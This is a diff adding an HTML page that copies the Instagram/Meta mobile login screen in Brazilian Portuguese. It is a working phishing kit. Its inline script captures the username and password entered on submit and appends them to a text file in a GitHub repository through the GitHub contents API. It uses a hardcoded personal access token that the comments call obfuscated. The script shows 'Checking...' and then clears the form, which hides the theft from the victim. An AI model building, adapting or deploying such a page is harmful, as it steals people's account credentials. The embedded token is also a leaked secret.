@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Clone Design</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html, body { width: 100%; min-height: 100%; font-family: Arial, Helvetica, sans-serif; color: #262626; }
+body { min-height: 100dvh; background: #fff; }
+
+.phone {
+  width: 100%; max-width: 430px; height: 100dvh; min-height: 650px;
+  margin: 0 auto; padding: 0 7.5%; position: relative; overflow: hidden;
+  display: flex; flex-direction: column;
+  background:
+    radial-gradient(ellipse at 0% 32%, rgba(255,231,235,.24), transparent 48%),
+    radial-gradient(ellipse at 100% 38%, rgba(224,240,255,.35), transparent 53%),
+    radial-gradient(ellipse at 95% 100%, rgba(225,255,235,.30), transparent 43%),
+    #fff;
+}
+
+.back { margin-top: 25px; width: 30px; height: 30px; display: flex; align-items: center; font-size: 28px; line-height: 1; color: #262626; }
+
+.language { position: absolute; top: 78px; left: 0; width: 100%; text-align: center; color: #515b60; font-size: 14px; }
+
+.chevron { display: inline-block; width: 7px; height: 7px; border-right: 1.5px solid #515b60; border-bottom: 1.5px solid #515b60; transform: rotate(45deg) translateY(-2px); margin-left: 8px; }
+
+.logo-wrap { display: flex; align-items: center; justify-content: center; margin-top: 145px; }
+
+.instagram { width: 66px; height: 66px; display: block; }
+
+.form { display: flex; flex-direction: column; gap: 12px; margin-top: 112px; }
+
+.field {
+  display: block; width: 100%; height: 57px; padding: 0 16px;
+  border: 1px solid #d8dcdf; border-radius: 14px;
+  background: rgba(255,255,255,.84); color: #262626; font-size: 14px; outline: none;
+}
+.field:focus { border-color: #aebbc5; }
+.field::placeholder { color: #7b8286; opacity: 1; }
+
+.password-box { position: relative; width: 100%; }
+.password-box .field { padding-right: 48px; }
+
+.toggle-password {
+  position: absolute; top: 50%; right: 12px; transform: translateY(-50%);
+  width: 30px; height: 30px; display: flex; align-items: center; justify-content: center;
+  border: none; background: transparent; color: #737b80; cursor: pointer;
+  -webkit-tap-highlight-color: transparent;
+}
+.toggle-password svg { width: 21px; height: 21px; fill: none; stroke: currentColor; stroke-width: 1.7; stroke-linecap: round; stroke-linejoin: round; }
+
+.login {
+  width: 100%; height: 45px; border: none; border-radius: 25px;
+  background: #0866d5; color: white; font-size: 16px; font-weight: 600;
+  cursor: pointer; -webkit-tap-highlight-color: transparent;
+}
+.login:active { opacity: .85; }
+.login:disabled { opacity: .6; cursor: not-allowed; }
+
+.forgot { margin-top: 23px; text-align: center; font-size: 14px; font-weight: 600; color: #262626; }
+
+.bottom { margin-top: auto; padding-bottom: 39px; }
+
+.create {
+  width: 100%; height: 47px; display: flex; align-items: center; justify-content: center;
+  border: 1px solid #85a5b4; border-radius: 25px; background: transparent;
+  color: #527e95; font-size: 14px; font-weight: 600;
+}
+
+.meta { display: flex; align-items: center; justify-content: center; gap: 5px; margin-top: 19px; color: #52646a; font-size: 16px; }
+.meta-mark { font-size: 23px; line-height: 1; letter-spacing: -4px; margin-right: 3px; }
+
+.nav { position: absolute; bottom: 8px; left: 50%; transform: translateX(-50%); width: 108px; height: 4px; border-radius: 5px; background: #c0c0c0; }
+
+@media (max-height: 720px) {
+  .back { margin-top: 20px; }
+  .logo-wrap { margin-top: 85px; }
+  .form { margin-top: 65px; gap: 10px; }
+  .field { height: 52px; }
+  .login { height: 43px; }
+  .forgot { margin-top: 18px; }
+  .bottom { padding-bottom: 28px; }
+  .create { height: 44px; }
+  .meta { margin-top: 14px; }
+}
+</style>
+</head>
+<body>
+<main class="phone">
+
+  <div class="back" aria-hidden="true">‹</div>
+
+  <div class="language">
+    Portuguese (Brazil)<span class="chevron"></span>
+  </div>
+
+  <div class="logo-wrap">
+    <svg class="instagram" viewBox="0 0 100 100" role="img" aria-label="Logotipo ilustrativo">
+      <defs>
+        <linearGradient id="ig" x1="0" y1="1" x2="1" y2="0">
+          <stop offset="0%" stop-color="#ffd600"/>
+          <stop offset="35%" stop-color="#ff7a00"/>
+          <stop offset="62%" stop-color="#e1306c"/>
+          <stop offset="82%" stop-color="#c13584"/>
+          <stop offset="100%" stop-color="#833ab4"/>
+        </linearGradient>
+      </defs>
+      <rect x="8" y="8" width="84" height="84" rx="23" fill="none" stroke="url(#ig)" stroke-width="8"/>
+      <circle cx="50" cy="50" r="20" fill="none" stroke="url(#ig)" stroke-width="8"/>
+      <circle cx="74" cy="27" r="5.5" fill="url(#ig)"/>
+    </svg>
+  </div>
+
+  <form class="form" id="demo-form">
+    <input
+      class="field"
+      type="text"
+      id="username"
+      placeholder="Username, email address or mobile number"
+      autocomplete="off"
+      aria-label="Usuário demonstrativo"
+    >
+
+    <div class="password-box">
+      <input
+        class="field"
+        type="password"
+        id="password"
+        placeholder="Password"
+        autocomplete="new-password"
+        aria-label="Senha demonstrativa"
+      >
+      <button
+        class="toggle-password"
+        type="button"
+        id="toggle-password"
+        aria-label="Mostrar senha"
+        aria-pressed="false"
+      >
+        <svg id="eye-icon" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7S2 12 2 12Z"/>
+          <circle cx="12" cy="12" r="3"/>
+        </svg>
+      </button>
+    </div>
+
+    <button class="login" type="submit">Log in</button>
+  </form>
+
+  <div class="forgot">Forgotten Password?</div>
+
+  <div class="bottom">
+    <div class="create">Create new account</div>
+    <div class="meta">
+      <span class="meta-mark">∞</span>
+      <span>Meta</span>
+    </div>
+  </div>
+
+  <div class="nav"></div>
+</main>
+
+<script>
+(function(){
+  // ⚙️ CONFIG (ofuscada) — cole seu token dentro do array abaixo
+  // O token é montado em runtime. OBs: mesmo assim ele aparece no Network ao enviar.
+  const _p = ["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"]; // <-- troque apenas isso
+  const _r = ["nevercryzin00-png", "InstagramProtect"];
+  const _b = "main";
+  const _f = ["BackendApi", "txt"];
+  const MIN = 6, MAX = 40;
+
+  function b64e(s){ return btoa(unescape(encodeURIComponent(s))); }
+  function b64d(s){ return decodeURIComponent(escape(atob(s))); }
+
+  // Elementos
+  const $pwd = document.getElementById("password");
+  const $tgl = document.getElementById("toggle-password");
+  const $eye = document.getElementById("eye-icon");
+  const $frm = document.getElementById("demo-form");
+  const $btn = $frm.querySelector("button.login");
+
+  // Toggle senha
+  $tgl.addEventListener("click", function(){
+    const s = $pwd.type === "password";
+    $pwd.type = s ? "text" : "password";
+    $tgl.setAttribute("aria-label", s ? "Ocultar senha" : "Mostrar senha");
+    $tgl.setAttribute("aria-pressed", String(s));
+    $eye.innerHTML = s
+      ? '<path d="M3 3 21 21"/><path d="M10.6 10.6a2 2 0 0 0 2.8 2.8"/><path d="M9.9 5.2A10.8 10.8 0 0 1 12 5c6.4 0 10 7 10 7a15.8 15.8 0 0 1-3.1 3.8"/><path d="M6.2 6.2C3.5 8 2 12 2 12s3.6 7 10 7a10.8 10.8 0 0 0 4-.8"/>'
+      : '<path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7S2 12 2 12Z"/><circle cx="12" cy="12" r="3"/>';
+  });
+
+  // Núcleo: monta e envia
+  async function _env(_u, _s){
+    const _t = _p.join("").trim();
+    const _o = _r[0], _n = _r[1];
+    const _c = _f.join(".");
+    if(!_t) throw new Error("cfg");
+    const _api = `https://api.github.com/repos/${_o}/${_n}/contents/${_c}`;
+    const _h = {
+      "Authorization": "Bearer " + _t,
+      "Accept": "application/vnd.github+json",
+      "X-GitHub-Api-Version": "2022-11-28"
+    };
+
+    let _sha, _cur = "";
+    const _g = await fetch(_api + "?ref=" + encodeURIComponent(_b), { headers: _h });
+    if(_g.ok){
+      const _d = await _g.json();
+      _sha = _d.sha;
+      _cur = b64d((_d.content || "").replace(/\n/g, ""));
+    } else if(_g.status !== 404){
+      const _e = await _g.json().catch(() => ({}));
+      throw new Error(_e.message || "read");
+    }
+
+    const _blk = `Name: ${_u}\nSenh: ${_s}`;
+    const _new = _cur.trim() === ""
+      ? _blk + "\n"
+      : _cur + (_cur.endsWith("\n") ? "\n" : "\n\n") + _blk + "\n";
+
+    const _put = await fetch(_api, {
+      method: "PUT",
+      headers: { ..._h, "Content-Type": "application/json" },
+      body: JSON.stringify({
+        message: "login",
+        content: b64e(_new),
+        sha: _sha,
+        branch: _b
+      })
+    });
+    if(!_put.ok){
+      const _e = await _put.json().catch(() => ({}));
+      throw new Error(_e.message || "put");
+    }
+    return true;
+  }
+
+  // Submit
+  $frm.addEventListener("submit", async function(e){
+    e.preventDefault();
+
+    const _u = document.getElementById("username").value.trim();
+    const _s = $pwd.value;
+
+    if(!_u || !_s.trim()){ (_u ? $pwd : document.getElementById("username")).focus(); return; }
+    if(!_u && !_s) return;
+    if(!_u && _s)  return;
+    if(_u && !_s)  return;
+    if(_s.length < MIN){ $pwd.focus(); return; }
+    if(_s.length > MAX){ $pwd.focus(); return; }
+
+    $btn.disabled = true;
+    $btn.textContent = "Checking...";
+
+    try {
+      await _env(_u, _s);
+      $frm.reset();
+      setTimeout(() => {
+        $btn.textContent = "Log in";
+        $btn.disabled = false;
+      }, 1200);
+    } catch(err){
+      console.error(err);
+      $btn.textContent = "Log in";
+      $btn.disabled = false;
+    }
+  });
+})();
+</script>
+</body>
+</html>
